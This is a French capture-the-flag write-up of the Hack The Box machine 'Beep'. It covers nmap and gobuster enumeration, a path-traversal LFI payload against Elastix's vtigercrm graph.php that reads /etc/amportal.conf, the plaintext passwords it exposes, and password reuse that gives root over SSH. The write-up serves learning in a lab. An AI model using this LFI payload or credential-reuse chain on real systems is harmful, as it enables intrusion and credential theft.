**Box BEEP**

https://app.hackthebox.eu/machines/Beep

Une petite box sur linux, avec à priori pas mal de chemin vers le root.

**Enumération:**

Le scan nmap montre beaucoup de services différents:
```
nmap -sS -sV 10.10.10.7

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-06 11:04 CEST
Nmap scan report for 10.10.10.7
Host is up (0.032s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https?
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.20 seconds
```
Il y à un site internet tournant sur le port 80/443, et une interface admin sur le port 10000.
Postfix ressort dans searchsploit comme un vecteur d'élévation de privilége possible, et openSSH est énumérable pour récupérer des utilisateurs.
Le port 111 étant ouvert, je regarde s'il existe un dossier partagé
```
showmount -e 10.10.10.7                                       
clnt_create: RPC: Program not registered
```
Rien d'intéressant de ce coté. Essayons du coté du site web

**Enumération du site**

Premiére surprise, le certificat est expiré. On accepte le risque de sécurité et on découvre une interface Elastix. Le site utilise Php 5.1.6, ce qui ouvre la porte à de l'execution de code à distance, et du scan de dictionnaire. Avant tout essayons de scanner les répertoires du site.
Pour ceci dirb ne pourra être utilsé à cause du certificat expiré. J'utiliserais donc gobuster qui à une option pour ignorer le certificat
```
gobuster dir -k -u https://10.10.10.7 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/06 12:02:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/cgi-bin/             (Status: 403) [Size: 286]                                
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/favicon.ico          (Status: 200) [Size: 894]                                  
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]   
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] 
/index.php            (Status: 200) [Size: 1785]                                 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/robots.txt           (Status: 200) [Size: 28]                                   
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] 
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/] 
```
Un passage sur la page admin nous demande de nous authentifier, mais aprés plusieurs erreurs nous ammene sur le panneau de controle d'administration sans être authentifié. Cela nous permet d'avoir accés au service tournant sur cette partie administration, FreePBX 2.8.1.4.

**Exploitation**

Une recherche sur elastix nous donne plusieurs possibilitée d'entrée, dont une faille LFI. Voici le lien qui explique cette faille:
https://www.exploit-db.com/exploits/37637

`#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&actioǹ`

En utilisant cette faille, nous arrivons sur une page avec un fichier de configuration des comptes. 

`view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`

La page non formatée est difficile à lire, utiliser view-source permet d'avoir le document plus lisible. Nous trouvons ces informations:
```
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```
Le mot de passe administrateur est ici en clair. Comme le ssh est ouvert sur cette machine, il est intéressant d'essayer ce mot de passe administrateur pour voir s'il y à réutilisation des mots de passe
Attention, les protocoles utilisés sont assez ancien, aprés quelques recherches j'ai trouvé comment négocier avec ce serveur SSH en utilisant les algorithme de chiffrement proposés
```
ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7                                    255 ⨯
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
```

Nous sommes root et avons donc accés au deux flags, dans le dossier /root, et dans le dossier /home/fanis.

**Conclusion**

Cette box aura été intéressante, j'aurais appris comment négocier avec d'anciens protocoles, sorti un peu de ma zone de confort en utilisant d'autres outils que ceux auquels j'étais habitués. Je reviendrais surement plus tard sur d'autres méthodes d'accés


